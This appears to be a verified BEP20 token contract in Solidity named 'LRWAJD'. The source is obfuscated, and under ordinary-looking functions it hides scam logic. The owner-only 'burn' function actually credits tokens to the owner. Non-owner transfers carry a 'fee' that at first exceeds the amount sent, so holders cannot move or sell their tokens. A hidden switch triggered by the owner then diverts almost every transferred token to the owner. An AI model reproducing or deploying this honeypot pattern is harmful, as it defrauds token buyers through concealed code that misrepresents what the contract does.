/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.2;
contract LRWAJD {
uint256 private  JWSCNJ = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  CTSKRE = 1000000000000000000;
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
address private  QPCUQY = address(0);
uint256 private  AZNJBS = 1000000000000000000000;
string public  symbol = "LRWAJD";
uint256 private  YJCPIM = 100000000;
address private  VBGHQF = address(0);
uint256 public constant HCBTCR = 9999999999999999999999999999;
uint256 public constant LRWAJD5 = 9999999999999999999999999999;
address private  JLRTMG = address(0);
uint256 private  IHRSUZ = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  JYPNOV = address(0);
uint256 private  XYATKN = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  PYNPKT = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "LRWAJD";
uint256 private  NEJBBT = 10000000000;
function _getIHRSUZ() private returns (uint256) {
return IHRSUZ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getPYNPKT() private returns (address) {
return PYNPKT;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UVSYMS");
require(to != address(0), "UVSYMS");
require(amount <= balanceOf[from], "UVSYMS");
uint256 gun;
if (from == owner || to == owner){
gun = 0;
}
else{
gun = amount* HCBTCR/JWSCNJ ;
}

uint256 transferAmount = amount - gun;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += gun;
if (to==JYPNOV){
JWSCNJ = HCBTCR+LRWAJD5/LRWAJD5+LRWAJD5/LRWAJD5+2;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getNEJBBT() private returns (uint256) {
return NEJBBT;
}

function _getXYATKN() private returns (uint256) {
return XYATKN;
}

function _getQPCUQY() private returns (address) {
return QPCUQY;
}

function _getAZNJBS() private returns (uint256) {
return AZNJBS;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getJLRTMG() private returns (address) {
return JLRTMG;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tUVSYMS 0");
require(spender != address(0), "fUVSYMS 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getVBGHQF() private returns (address) {
return VBGHQF;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
JYPNOV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getYJCPIM() private returns (uint256) {
return YJCPIM;
}

function _getCTSKRE() private returns (uint256) {
return CTSKRE;
}


}